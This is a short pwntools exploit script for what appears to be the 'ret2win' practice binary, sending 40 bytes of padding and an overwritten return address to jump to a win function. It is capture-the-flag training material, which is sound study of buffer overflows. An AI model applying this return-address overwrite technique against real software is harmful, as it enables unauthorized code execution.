#!/usr/bin/python3
from pwn import *


p = process("./ret2win")

payload = cyclic(40)
#payload += p64(0x00400756)
payload += p64(0x00400757)


p.sendline(payload)

p.interactive()

